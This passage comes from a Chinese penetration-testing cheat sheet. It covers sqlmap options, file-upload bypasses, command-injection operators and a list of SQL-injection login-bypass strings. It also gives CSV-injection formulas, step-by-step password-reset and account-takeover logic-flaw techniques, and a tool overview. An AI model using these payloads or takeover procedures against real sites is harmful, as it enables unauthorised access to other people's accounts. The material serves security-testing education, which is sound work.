class="line">当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高为5  </span><br><span class="line">--risk 3 【执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全  </span><br><span class="line">-v 【详细的等级(0-6)  </span><br><span class="line">0：只显示Python的回溯，错误和关键消息。  </span><br><span class="line">1：显示信息和警告消息。  </span><br><span class="line">2：显示调试消息。  </span><br><span class="line">3：有效载荷注入。  </span><br><span class="line">4：显示HTTP请求。  </span><br><span class="line">5：显示HTTP响应头。  </span><br><span class="line">6：显示HTTP响应页面的内容</span><br><span class="line"></span><br><span class="line">--privileges #查看权限</span><br><span class="line"></span><br><span class="line">--tamper xx.py,cc.py #防火墙绕过，后接tamper库中的py文件</span><br><span class="line"></span><br><span class="line">--method &quot;POST&quot; --data &quot;page=1&amp;id=2&quot; #POST方式提交数据</span><br><span class="line"></span><br><span class="line">--threads number　　#采用多线程 后接线程数</span><br><span class="line"></span><br><span class="line">--referer &quot;&quot; #使用referer欺骗</span><br><span class="line"></span><br><span class="line">--user-agent &quot;&quot; #自定义user-agent</span><br><span class="line"></span><br><span class="line">--proxy “目标地址″ #使用代理注入</span><br></pre></td></tr></table></figure><br>sqlmap常用路径：</p>
<blockquote>
<p>添加表字段的目录在/usr/share/sqlmap/txt/common-tables.txt</p>
<p>存放扫描记录的目录在/root/.sqlmap/output</p>
</blockquote>
<p>高阶玩法：<br>自己写tamper.py</p>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a><strong>XSS</strong></h3><p>xss漏洞原理分析与挖掘方法 - 知乎<br>web漏洞 | XSS（跨站攻击脚本）详解<br>XSS汇总<br>XSS小结 - 先知社区<br>2020跨站点脚本[xss]速查表|雨苁<br>XSSer自动化工具<br>XSStrike 自动化绕过WAF<br>xss payload字典 burp爆破　<br>客服对话系统上XSS打cookie<br>搭建XSS平台 3s.wf/<br><a href="http://xssor.io">http://xssor.io</a></p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a><strong>文件上传</strong></h3><p>字典生成 <a href="https://github.com/c0ny1/upload-fuzz-dic-builder">https://github.com/c0ny1/upload-fuzz-dic-builder</a><br><strong>文件上传绕过总结，详见笔记</strong><br>目录穿越<br>上传后如果没有被文件重命名，可以在文件名值做目录跳转<br>注意一些像目录的参数名<br>dir　path　location　url<br>文件头绕过<br>修改上传类型 Content-Type</p>
<p>双文件上传</p>
<p>截断<br>长文件名<br>长Content-Disposition<br>%00截断<br>特殊文件<br>svg / html / htm / swf<br>xss<br>pdf<br>chrome 里可以跳转<br>cer / asa / spx / php5 / phtml<br>可能会被当做动态语言解析<br>.htaccess / .user.ini / web.config / web.xml<br>修改解析规则<br>.xls / .xlsx<br>POI Excel XXE<br>.tar / .tar.gz / .zip<br>可能存在文件释放目录跳转问题<br>.pkl<br>python反序列化文件<br>.xml<br>可能有 XXE<br>.yaml / .yml<br>YAML 反序列化<br>.jar / .class<br>上传到 java classpath 的目录下，类被加载时执行代码<br>无大小和次数限制<br>无限上传制造垃圾数据堵死硬盘<br>有图片加工的地方可以注意一下imagemagick命令执行</p>
<p>文件读取  读取系统敏感文件<br>文件包含  可读取文件或代码执行<br>文件删除  删除配置文件可破坏网站、删除安装锁可重装<br>文件解压  如果上传文件为 tar / tar.gz 类型，可以尝试构压缩包内文件名为../../../../xxx 的tar包<br>文件导出  如果是CSV 或者 Excel可以注意一下CSV注入</p>
<p>=2222-1<br>-1+1=2222-1<br>@=2222-1<br>\r\n=2222-1<br>111,=2222-1,</p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a><strong>命令执行</strong></h3><p>命令注入<br>–xxxx 参数注入<br>| 和 | | 与符号<br>&amp; 和 &amp;&amp; 与符号<br>; 分号<br>${}</p>
<p>代码执行<br>表达式<br>freemarker<br>OGNL<br>Spel<br>jsel<br>非表达式（php）<br>eval<br>assert<br>call_user_func() / call_user_func_array()<br>preg_replace()<br>create_function()<br>array_map()<br>array_filter()<br>usort() / uasort()<br>反序列化<br>php 源文件拼接写入<br>java<br>反序列化<br>远程 jar 加载<br>反射机制<br>jsp 源文件拼接写入</p>
<h3 id="弱口令及字典破解"><a href="#弱口令及字典破解" class="headerlink" title="弱口令及字典破解"></a><strong>弱口令及字典破解</strong></h3><p>后台弱口令爆破撞库<br>（尝试万能密码、特定资产常用密码、弱口令后再撞库、有的数据库要输对用户名再注释<br>我的github有收集的字典　<a href="https://github.com/hackerX2021）">https://github.com/hackerX2021）</a><br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">asp aspx万能密码 </span><br><span class="line">1： &quot;or &quot;a&quot;=&quot;a </span><br><span class="line">2： &#x27;)or(&#x27;a&#x27;=&#x27;a </span><br><span class="line">3：or 1=1-- </span><br><span class="line">4：&#x27;or 1=1-- </span><br><span class="line">5：a&#x27;or&#x27; 1=1-- </span><br><span class="line">6： &quot;or 1=1-- </span><br><span class="line">7：&#x27;or&#x27;a&#x27;=&#x27;a </span><br><span class="line">8： &quot;or&quot;=&quot;a&#x27;=&#x27;a </span><br><span class="line">9：&#x27;or&#x27;&#x27;=&#x27; </span><br><span class="line">10：&#x27;or&#x27;=&#x27;or&#x27; </span><br><span class="line">11: 1 or &#x27;1&#x27;=&#x27;1&#x27;=1 </span><br><span class="line">12: 1 or &#x27;1&#x27;=&#x27;1&#x27; or 1=1 </span><br><span class="line">13: &#x27;OR 1=1%00 </span><br><span class="line">14: &quot;or 1=1%00 </span><br><span class="line">15: &#x27;xor </span><br><span class="line">16: 新型万能登陆密码 用户名 &#x27; UNION Select 1,1,1 FROM admin Where &#x27;&#x27;=&#x27; （替换表名admin） </span><br><span class="line">密码 1 Username=-1%cf&#x27; union select 1,1,1 as password,1,1,1 %23 Password=1 </span><br><span class="line"></span><br><span class="line">17..admin&#x27; or &#x27;a&#x27;=&#x27;a 密码随便 PHP万能密码 &#x27;or&#x27;=&#x27;or&#x27; &#x27;or 1=1/* 字符型 GPC是否开都可以使用 User: something Pass: &#x27; OR &#x27;1&#x27;=&#x27;1 jsp 万能密码 1&#x27;or&#x27;1&#x27;=&#x27;1 admin&#x27; OR 1=1/* </span><br><span class="line">用户名：admin 系统存在这个用户的时候 才用得上 密码：1&#x27;or&#x27;1&#x27;=&#x27;1 pydictor、cupp、crunch字典生成工具、自写字典生成py（小黑的人名字典py）； </span><br><span class="line">dymerge字典合并去重工具、自己写去重py；hydra爆破工具</span><br></pre></td></tr></table></figure><br>tips:<br>超级弱口令检验工具<br>burpsuite 爆破<br>使用弱用户名对密码进行暴力破解<br>使用弱口令密码对用户名进行暴力破解</p>
<h3 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a><strong>逻辑漏洞</strong></h3><p><strong>Cookie</strong><br>一些网站会利用 Cookie 是否为空、Session 是否为 true 来判断用户是否可以登录，只要构造一个 Cookie 或 Session 为 true 就可以绕过认证登录<br>通过修改 Cookie 中的某个参数来实现登录其他用户,要抓包具体分析</p>
<p><strong>数据篡改</strong><br>数量、金额、ID、邮箱等数据：最大超过限制、负数、0、其他用户数据，提交后查看是否进入正常业务流程，是否存在越权</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">例子： </span><br><span class="line">修改普通用户密码，</span><br><span class="line">抓包 将 Referer 和 POST 中的普通用户改成 admin 提交数据后，</span><br><span class="line">直接返回了 admin 的密码修改页面，</span><br><span class="line">利用逻辑漏洞获取超级权限 抓包修改手机号参数为其他号码进行尝试，</span><br><span class="line">例如办查询页面，</span><br><span class="line">输入自己的号码然后抓包，修</span><br><span class="line">改手机号为他人号码，</span><br><span class="line">查看是否可以查询他人业务 手机号 篡改 邮箱或者用户 篡改 订单ID 篡改 商品编号 篡改 用户ID 篡改 金额 篡改 商品数量 篡改</span><br></pre></td></tr></table></figure>
<p><strong>验证码绕过</strong><br>drop掉页面<br>返回包里可能就有验证码<br>一次验证码多用<br>验证码识别插件，burp</p>
<p><strong>注册界面：</strong><br>任意用户注册<br>可爆破用户名<br>注入<br>XSS</p>
<p><strong>登录界面：</strong><br>爆破用户名、密码<br>注入<br>万能密码<br>Xss Xss+Csrf<br>修改返回包信息，登入他人账户<br>修改cookie中的参数，如user,admin,id等<br>干货 | 登录点测试的Tips</p>
<p><strong>忘记密码界面：</strong><br>任意密码重置概要：<br>1．重置一个账户，不发送验证码，设置验证码为空发送请求。<br>2．发送验证码，查看相应包<br>3．验证码生存期的爆破<br>4．修改相应包为成功的相应包<br>5．手工直接跳转到校验成功的界面<br>6．两个账户，重置别人密码时，替换验证码为自己正确的验证码<br>7．重置别人密码时，替换为自己的手机号<br>8．重置自己的成功时，同意浏览器重置别人的，不发验证码<br>9．替换用户名，ID，cookie，token参数等验证身份的参数<br>10．通过越权修改他人的找回信息如手机/邮箱来重置</p>
<p><strong>用户凭证暴力破解（验证码）</strong><br>绕过的话，这里可以考虑一个现状：<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">例如： </span><br><span class="line">phone=18888888888abc 国内很多情况下都没有过滤字符和限制输出长度，</span><br><span class="line">验证很有可能只是简单的处理 只要更换手机号后面的字符，</span><br><span class="line">就可以绕过请求过于频繁的限制 但是校验时，</span><br><span class="line">手机号后面的字符会被过滤，</span><br><span class="line">也就是可以利用暴力破解验证码（不计入次数） 所以只要在暴力破解的同时，</span><br><span class="line">改变手机号后面的字符即可达到漏洞效果 根据手机号找回密码，</span><br><span class="line">但是验证次数被限制，</span><br><span class="line">抓包 可以尝试在手机号后面添加不为数字的字符，</span><br><span class="line">查看是否过滤 根据手机号找回密码，随便输个验证码，</span><br><span class="line">抓包 暴力破解验证码（假如只有四位），</span><br><span class="line">很快就可以破解出来 四位或六位纯数字，</span><br><span class="line">验证码次数未限制 例如： 如果验证码次数限制，破解一会就会提示请求过于频繁，</span><br><span class="line">这时就需要绕过限制 例如： 通过密保问题找回密码，查看源码，密保问题和答案就在源码中显示</span><br></pre></td></tr></table></figure></p>
<p><strong>返回凭证（验证码 及 token）、邮箱弱 token、用户凭证有效性、重新绑定</strong><br>抓包，可以发现返回的数据中有一个加密的字符串（token），先记录下这个加密字符串<br>继续按照正常流程，登录邮箱获得验证码，返回填写验证码后，进入下一个填写新密码页面，发现 URL 后新增了一个加密验证的字符串<br>这个字符串就是之前数据包中记录的字符串，所以邮箱验证码这个环节可以绕过，直接用他人邮箱抓包获得加密字符串就可以重置他人密码</p>
<p>根据手机号找回密码，抓包，可以发现验证码直接显示 verifycode=xxxx，或者由 md5 加密后显示，解密即可（同理，有的时候输入用户名，抓包可以看到返回的手机号等其他信息）</p>
<p>根据邮箱找回密码,抓包直接返回,密码找回凭证可能在页面中</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">例如： </span><br><span class="line">利用两个帐号同时点击找回密码，</span><br><span class="line">去邮箱查看找回密码的链接，</span><br><span class="line">发现两者的随机 token 只差 1-2，而且可以猜测出为服务器时间 所以可以用一个未知帐号和一个已知帐号同时点击找回密码，</span><br><span class="line">稍微遍历一下随机 token，</span><br><span class="line">就可以构造出未知帐号的密码找回链接 </span><br><span class="line">例如： 通过邮箱找回密码，正常流程去邮箱查看重置密码链接，</span><br><span class="line">发现链接处有一串 md5 加密字符串 字符串解密，</span><br><span class="line">类似 1491293277（10位），</span><br><span class="line">可以判断为 Unix时间戳，</span><br><span class="line">（可能md5） 重置他人密码只需要利用他人邮箱发送重置密码邮箱，</span><br><span class="line">在短时间内对 Unix时间戳 进行暴力破解，</span><br><span class="line">即可获得重置密码的链接 重置密码链接直接使用用户名来区别，</span><br><span class="line">改变用户名即可更改他人密码</span><br></pre></td></tr></table></figure>
<p><strong>绕过token</strong><br>正常流程下，对每个功能模块进行抓包，分别是发送验证码，验证验证码是否正确，获取 token，重置密码<br>接下来，用他人帐号通过邮箱验证，抓包，将其中 Cookie 内从 JSESSIONID 开始的内容替换至正常流程的发生验证码包内，同时替换自己接受验证码的邮箱，提交<br>通过邮箱获取验证码后，将验证码、Cookie、他人帐号、自己邮箱替换至验证验证码模块，提交（不用在意返回是否错误）<br>继续替换内至获取 token 模块，提交获取 token<br>最后将获取的 token 和上面的内容替换至最后的重置密码模块，提交成功修改密码<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">例如： 通过邮箱找回密码，访问链接重置密码，输入新密码后提交时抓包，虽然有 token，但是依然可以直接修改 用户ID 进而修改他人密码 例如： 通过他人手机号找回密码，抓包，将他人手机号替换成自己的手机号，获取验证码，提交后修改密码 通过自己手机号找回密码，获取验证码后抓包，将数据包中的 username 改为他人用户名，提交后成功修改他人密码</span><br></pre></td></tr></table></figure></p>
<p><strong>短信验证码、邮箱 token、重置密码 token</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如：</span><br><span class="line">通过邮箱找回密码，URL 链接中修改 用户ID 为他人，邮箱不变，之后通过链接可以将他人账户绑定为自己的邮箱，之后通过邮箱找回密码</span><br><span class="line">例如：</span><br><span class="line">给已知账户绑定手机，发现绑定手机的 URL 链接中有 uid 参数，修改 uid 参数为他人的，即可实现将他人的账户绑定上自己的手机，之后通过手机来修改密码</span><br><span class="line">修改个人资料处抓包，修改 userId 为他人，修改 mobilePhone 为自己的手机，即可实现将他人的账户绑定上自己的手机，之后通过手机来修改密码</span><br></pre></td></tr></table></figure>
<p><strong>手机绑定、邮箱绑定</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如：</span><br><span class="line">通过密码保护问题找回密码，抓包，将密码保护问题删除，直接修改密码，提交</span><br><span class="line">注：此处密保问题和新密码在同一页面</span><br><span class="line">例如：</span><br><span class="line">正常流程，通过手机号提交验证码找回密码处抓包，记录下这个包的内容</span><br><span class="line">通过已知用户名找回密码，查看源代码可以发现用户其他信息（比如：手机号、邮箱）</span><br><span class="line">通过发现的手机号选择通过手机找回密码，随便输入短信验证码，抓包</span><br><span class="line">修改之前记录下的包的内容，将其中 Session id、用户ID 修改为刚刚从其他用户名抓包获得的内容，提交这个包，即可成功修改他人密码</span><br></pre></td></tr></table></figure>
<p><strong>最终提交步骤</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如：</span><br><span class="line">通过邮箱找回密码，最后通过链接至修改密码页面，修改密码后提交，抓包，获得 Uid 参数，修改为他人，即可修改其他用户密码</span><br></pre></td></tr></table></figure>
<p><strong>服务器验证的验证逻辑为空（绕过认证）</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如：</span><br><span class="line">通过邮箱找回密码，点击请重新发送邮件处抓包，将邮箱改为自己的邮箱，通过链接成功修改密码</span><br><span class="line">例如：</span><br><span class="line">通过手机找回密码，输入验证码和新的密码，F12 审查元素，修改自己的手机为他人手机，提交成功修改他人手机（也可以抓包修改）</span><br><span class="line">例如：</span><br><span class="line">正常流程下，密码找回，查看最后设置新密码页面的 URL，记录下来</span><br><span class="line">继续返回密码找回处，输入其他用户名，提交找回申请，直接访问上面记录下的修改密码页面，成功修改密码</span><br><span class="line">也可以正常流程下，修改密码页面抓包，修改其中的 USERNAME_COOKIE 为其他用户（有可能会经过编码，比如 base64），提交即可修改其他用户密码</span><br><span class="line">如果抓包其中有 step 参数，可以修改这个参数为最后一步（比如：5），提交便可略过之前的步骤</span><br><span class="line">跳过验证步骤、找回方式、直接到设置新密码页面</span><br><span class="line">例如：</span><br><span class="line">通过用户名找回密码，提交后会自动发送验证码到手机中，所以抓包，修改手机为自己的手机（如果其中有 type 之类的参数，也可以尝试修改，有 email之类的参数，可以尝试删除内容）</span><br><span class="line">发送修改后的包，手机成功接收验证码</span><br><span class="line">输入验证码，继续发送，抓包，如果有 type 之类的参数，可以继续尝试修改，发送就可以成功修改密码</span><br><span class="line">例如：</span><br><span class="line">通过手机找回密码，随便输入验证码，抓包，发送，拦截返回包</span><br><span class="line">修改返回包中的返回码，继续发送，说不定就可以绕过验证，直接跳到修改密码的页面</span><br><span class="line"></span><br><span class="line">通过手机找回密码，正常流程下到重置密码页面，抓包查看返回数据中有一段加密字符串</span><br><span class="line">利用他人手机找回密码，URL 跳转到验证身份页面，链接中就有一段加密字符串，记录下，随便输入验证码</span><br><span class="line">抓包，修改包中数据为正常流程下的数据，替换加密字符串，Forward 发送，就可以绕过验证码，直接修改密码</span><br></pre></td></tr></table></figure>
<p>输入用户名，加个单引号报错，说明可能存在报错，抓包，保存为 txt 文件，导入 Sqlmap 中跑一遍</p>
<p>找回密码处存在注入漏洞(见框就×)</p>
<p>通过邮箱找回密码，正常流程下，抓包查看提交验证码后返回的数据，发现有加密字符串，这个加密字符串和后面重新设置新密码 URL 链接中的加密字符串一样，所以可以利用这个加密字符串<br>根据上面提交验证码的抓包，修改其中的 User 为其他用户（User 有可能会使用 md5 加密），发送，就可以返回其他用户的加密字符串<br>重新返回到找回密码首页，利用其他用户找回，点下一步，到输入验证码处（也有可能需要点击发送验证码），直接修改 URL 链接，加入加密字符串，可以直接绕过验证码，重置密码</p>
<p><strong>session覆盖漏洞</strong><br>注册重复的用户名，例如 admin，相当于修改了密码</p>
<p>同一浏览器，首先输入自己的账户进行邮箱密码找回，进入邮箱查看链接，接着输入他人账户，进行密码找回，返回刚刚自己的邮箱点击链接，由于 session 覆盖导致了，这个链接成为了修改他人密码的链接，成功修改他人密码</p>
<p><strong>尝试正常密码找回流程</strong><br>选择不同的找回方式，记录所有数据包<br>邮箱找回密码<br>根据密码保护问题找回密码<br>根据手机号找回密码<br>分析数据包，找出敏感部分<br>分析后台找回机制所采用的验证手段<br>修改数据包进行验证是否存在密码找回漏洞</p>
<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="Nmap-Network-Mapper"><a href="#Nmap-Network-Mapper" class="headerlink" title="Nmap (Network Mapper)"></a>Nmap (Network Mapper)</h2><p>在渗透测试的侦察和指纹识别阶段，Nmap从来都是专业人员的不二之选。Nmap是强大的网络发现工具和细致的安全审计工具的完美结合，其与众不同之处在于其令人惊叹的可定制性，用户可以根据需要定制其扫描范围或精确程度。对于渗透测试人员来说，Nmap是被动侦察阶段之后第一次主动与系统“秘密”接触。当Nmap执行任务时，很难被任何入侵检测系统察觉和标记。</p>
<h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><p>在渗透测试领域仍然受到高度尊重和重视。它是一款强大的利用和后利用阶段工具。它是针对远程目标开发、测试和执行漏洞利用代码的完整首选工具包。Metasploit的功能也不仅仅是寻找漏洞，还包括漏洞测试、执行以及了解如何在现实场景中利用。即便你最终会投奔Cobalt Strike，但Metasploit依然是上手的首选，因为它不但免费且用户友好。</p>
<h2 id="Offensive-OS"><a href="#Offensive-OS" class="headerlink" title="Offensive OS"></a>Offensive OS</h2><p>Offensive出品的渗透测试专用操作系统（Kali Linux/Parrot OS），在渗透测试员的工具箱中能排进前三。它们通常包含了从侦察和OSINT到数据泄露的每个渗透测试阶段所需的尽可能多的工具。</p>
<p>除了大名鼎鼎的Kali Linux，值得关注的是近来快速走红的Parrot OS，后者已经进入EC-Counci 等机构的CEH认证和考试模块。Parrot OS以其用户友好的界面和轻量级的环境吸引了更广泛的受众。</p>
<h2 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h2><p>对于Web应用安全研究者来说，Burp Suite是一款不可或缺的工具。它是一个完整的平台，包含了从扫描和爬行到攻击和利用的一系列工具。</p>
<p>Burp Suite是一个完整的软件包，一个注重多功能性和深度的集成平台。从扫描和蜘蛛抓取到攻击和利用，Burp可以拦截、操纵，对有效负载进行URL编码，更改交付方法，并且可以将请求直接发送到网站。</p>
<h2 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h2><p>作为漏洞扫描器领域的巨头，Nessus是最广泛下载、使用和识别的漏洞扫描工具之一。它用于扫描网络漏洞、配置问题、基准测试不足和补丁缺失等问题。一旦系统被指纹识别，渗透测试员可用Nessus确定该系统可能容易受到哪些类型的攻击，此步骤后，Metasploit等工具将陆续登场发挥威力。</p>
<h2 id="John-the-Ripper-Hashcat"><a href="#John-the-Ripper-Hashcat" class="headerlink" title="John the Ripper/Hashcat"></a>John the Ripper/Hashcat</h2><p>作为经典的密码破解工具，John the Ripper用于测试密码强度并破解各种类型的密码。它在测试网络环境中密码的弹性方面特别有效。大多数经验丰富的渗透测试人员会使用定制表进行字典和彩虹表攻击，但如果手头没有这些表，JohnRipper也能帮你完成工作。</p>
<p>如果你更偏爱Hashcat也没有问题。虽然有些认证测试题会让你选择哪个是“最佳”密码破解工具，但这实际上二者的选择仅仅取决于偏好。</p>
<h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><p>Wireshark是一款广泛用于网络故障排除、分析、开发和教育的网络协议分析器，其功能之丰富和强大给人感觉像“开挂”。Wireshark捕获并显示网络上来回传输的数据，使用户能够检查有关网络协议、数据包内容和网络流量的详细信息。</p>
<p>Wireshark支持用户在微观和宏观层面查看网络活动的详细信息。它用于诊断网络问题、检查网络安全问题、调试协议实现、了解网络协议内部结构，甚至评估防火墙规则。凭借其强大的过滤和搜索功能，Wireshark使用户能够从网络流量流中分离和分析感兴趣的特定数据包。这使其成为网络管理员、安全专业人员以及任何需要了解网络数据流的人不可或缺的工具。</p>
<h2 id="ZAP-Zed-Attack-Proxy"><a href="#ZAP-Zed-Attack-Proxy" class="headerlink" title="ZAP (Zed Attack Proxy)"></a>ZAP (Zed Attack Proxy)</h2><p>ZAP是一款开源的Web应用安全扫描器， 在Web应用安全领域的江湖地位与网络安全领域的Nessus类似。ZAP作为拦截代理，位于浏览器和Web应用之间，可以检查和操作到达网站的流量，自动发现Web应用中的安全漏洞。</p>
<p>ZAP广受欢迎的原因是对应用安全新手和专业开发人员都很友好。此外，ZAP还提供一系列实用的工具和功能，包括自动扫描仪、一组用于手动测试的工具以及用于扩展功能的各种附加组件，使其成为Web应用程序安全测试的全面解决方案。</p>
<h2 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h2><p>SQLmap是一款自动化检测和利用Web应用中 SQL注入漏洞的工具。它通过发送各种类型的请求到目标Web应用并分析响应来识别潜在的漏洞。一旦找到SQL注入漏洞，SQLmap可用于从数据库中提取数据、获得数据库管理权限甚至在服务器上执行远程命令。</p>
<p>SQLmap已经存在多年，但毫无疑问，它仍然是渗透测试领域的重量级工具。2024年，SQL注入仍然是重要威胁，而SQLmap是能够正面应对SQL注入挑战的为数不多的自动化工具。</p>
<h2 id="Aircrack-ng"><a href="#Aircrack-ng" class="headerlink" title="Aircrack-ng"></a>Aircrack-ng</h2><p>Aircrack-ng是无线渗透测试领域的重量级选手， 提供了一整套工具和功能，专注于Wi-Fi安全的各个领域，如监控、发起隐秘攻击、严格测试防御以及像大师级锁匠一样破解棘手的WPA密钥。其主要用途是识别和利用Wi-Fi网络的漏洞，特别是针对WEP和WPA/WPA2-PSK安全协议。</p>
<p>Aircrack-ng还提供用于将无线网卡置于监控模式的Airmon-ng、用于数据包捕获的Airodump-ng以及用于生成流量并诱发有利于网络分析和攻击的条件的Aireplay-ng。该工具被网络管理员广泛用于安全评估，并被网络安全专业人员和道德黑客广泛用于测试无线网络针对未经授权访问和其他安全威胁的强度和弹性。</p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
</search>
